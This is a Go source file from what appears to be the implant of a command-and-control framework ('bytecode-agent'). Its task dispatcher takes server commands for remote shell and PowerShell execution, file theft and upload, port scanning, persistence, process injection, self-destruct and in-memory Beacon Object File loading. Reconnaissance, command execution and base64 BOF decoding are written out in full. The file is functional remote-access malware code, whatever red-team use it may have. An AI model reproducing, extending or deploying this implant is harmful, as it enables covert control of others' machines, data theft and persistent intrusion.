package executor

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"

	"bytecode-agent/internal/comms"
	"bytecode-agent/internal/identity"
	"bytecode-agent/internal/loader"
)

// MaxOutputSize limits the output size sent back to the server
const MaxOutputSize = 1024 * 1024 // 1MB

// Execute handles task execution based on type
func Execute(task *comms.TaskPayload, apiKey string) *comms.ResultRequest {
	result := &comms.ResultRequest{
		TaskID: task.ID,
		Status: "success",
	}

	var output string
	var err error

	switch task.Type {
	case "system_info":
		output = collectSystemInfo()
	case "execute_command":
		output, err = executeCommand(task.Payload)
	case "ps":
		output, err = listProcesses()
	case "ps_json":
		output, err = listProcessesJSON()
	case "kill":
		output, err = killProcess(task.Payload)
	case "screenshot":
		output, err = captureScreenshot()
	case "ls":
		output, err = listDirectory(task.Payload)
	case "ls_json":
		output, err = listDirectoryJSON(task.Payload)
	case "cd":
		output, err = changeDirectory(task.Payload)
	case "pwd":
		output, err = printWorkingDirectory()
	case "mkdir":
		output, err = makeDirectory(task.Payload)
	case "rm":
		output, err = deleteFileFromDisk(task.Payload)
	case "cp":
		output, err = copyFile(task.Payload)
	case "mv":
		output, err = moveFile(task.Payload)
	case "cat":
		output, err = readFile(task.Payload)
	case "download":
		output, err = readFile(task.Payload)
	case "upload":
		output, err = writeFileToDisk(task.Payload)
	case "download_url":
		output, err = downloadFromUrl(task.Payload, apiKey, task.ID)
	case "upload_url":
		output, err = uploadToUrl(task.Payload, apiKey, task.ID)
	case "netstat":
		output, err = getNetworkInfo(task.Payload)
	case "netstat_json":
		output, err = getNetworkInfoJSON(task.Payload)
	case "portscan":
		output, err = portScan(task.Payload)
	case "persist":
		output, err = addPersistence(task.Payload)
	case "unpersist":
		output, err = removePersistence(task.Payload)
	case "self_destruct":
		output, err = selfDestruct()
	case "getprivs":
		output, err = getPrivileges()
	case "getenv":
		output, err = getEnvironment()
	case "powershell":
		output, err = executePowerShell(task.Payload)
	case "sleep_update":
		output = "sleep interval updated"
	case "inject":
		output, err = handleInjection(task.Payload)
	case "bof_run":
		output, err = handleBOFRun(task.Payload)
	default:
		err = fmt.Errorf("unknown task type: %s", task.Type)
	}

	if err != nil {
		result.Output = output
		result.Error = err.Error()
		result.Status = "error"
	} else {
		result.Output = output
	}

	// Truncate output if too large
	if len(result.Output) > MaxOutputSize {
		result.Output = result.Output[:MaxOutputSize] + "\n... [output truncated]"
	}

	return result
}

// collectSystemInfo gathers system metadata
func collectSystemInfo() string {
	info := identity.GetSystemInfo()

	data := map[string]interface{}{
		"hostname":    info.Hostname,
		"os":          info.OS,
		"arch":        info.Arch,
		"pid":         info.PID,
		"internal_ip": info.InternalIP,
		"go_version":  runtime.Version(),
		"num_cpu":     runtime.NumCPU(),
		"num_goroutine": runtime.NumGoroutine(),
		"timestamp":   time.Now().UTC().Format(time.RFC3339),
	}

	// Try to get additional system info
	switch runtime.GOOS {
	case "linux":
		if out, err := exec.Command("uname", "-a").Output(); err == nil {
			data["uname"] = strings.TrimSpace(string(out))
		}
		if out, err := exec.Command("whoami").Output(); err == nil {
			data["user"] = strings.TrimSpace(string(out))
		}
		if out, err := exec.Command("id").Output(); err == nil {
			data["id"] = strings.TrimSpace(string(out))
		}
	case "windows":
		if out, err := exec.Command("whoami").Output(); err == nil {
			data["user"] = strings.TrimSpace(string(out))
		}
	}

	jsonBytes, _ := json.MarshalIndent(data, "", "  ")
	return string(jsonBytes)
}

// executeCommand runs a shell command and returns output
func executeCommand(payload interface{}) (string, error) {
	// Parse the command from payload
	payloadMap, ok := toMap(payload)
	if !ok {
		return "", fmt.Errorf("invalid payload: expected object with 'command' field")
	}

	cmdStr, ok := payloadMap["command"].(string)
	if !ok || cmdStr == "" {
		return "", fmt.Errorf("missing or empty 'command' in payload")
	}

	var cmd *exec.Cmd
	switch runtime.GOOS {
	case "windows":
		cmd = exec.Command("cmd", "/C", cmdStr)
	default:
		cmd = exec.Command("/bin/sh", "-c", cmdStr)
	}

	// Set timeout
	done := make(chan error, 1)
	var output []byte

	go func() {
		var err error
		output, err = cmd.CombinedOutput()
		done <- err
	}()

	select {
	case err := <-done:
		if err != nil {
			return string(output), fmt.Errorf("command failed: %w", err)
		}
		return string(output), nil
	case <-time.After(120 * time.Second):
		if cmd.Process != nil {
			cmd.Process.Kill()
		}
		return "", fmt.Errorf("command timed out after 120 seconds")
	}
}

// readFile reads a file and returns its contents
func readFile(payload interface{}) (string, error) {
	payloadMap, ok := toMap(payload)
	if !ok {
		return "", fmt.Errorf("invalid payload: expected object with 'path' field")
	}

	path, ok := payloadMap["path"].(string)
	if !ok || path == "" {
		return "", fmt.Errorf("missing or empty 'path' in payload")
	}

	data, err := os.ReadFile(path)
	if err != nil {
		return "", fmt.Errorf("failed to read file: %w", err)
	}

	return string(data), nil
}

// toMap converts an interface{} to map[string]interface{}
func toMap(v interface{}) (map[string]interface{}, bool) {
	switch val := v.(type) {
	case map[string]interface{}:
		return val, true
	case string:
		var m map[string]interface{}
		if err := json.Unmarshal([]byte(val), &m); err == nil {
			return m, true
		}
	}
	return nil, false
}

// handleBOFRun handles Beacon Object File execution
func handleBOFRun(payload interface{}) (string, error) {
	payloadMap, ok := toMap(payload)
	if !ok {
		return "", fmt.Errorf("invalid payload: expected object")
	}

	b64Data, ok := payloadMap["bof_data"].(string)
	if !ok {
		return "", fmt.Errorf("missing bof_data in payload")
	}

	entryName, _ := payloadMap["entry"].(string)
	if entryName == "" {
		entryName = "go" // Default BOF entry point
	}

	data, err := base64.StdEncoding.DecodeString(b64Data)
	if err != nil {
		return "", fmt.Errorf("failed to decode BOF data: %v", err)
	}

	return loader.RunBOF(data, entryName)
}
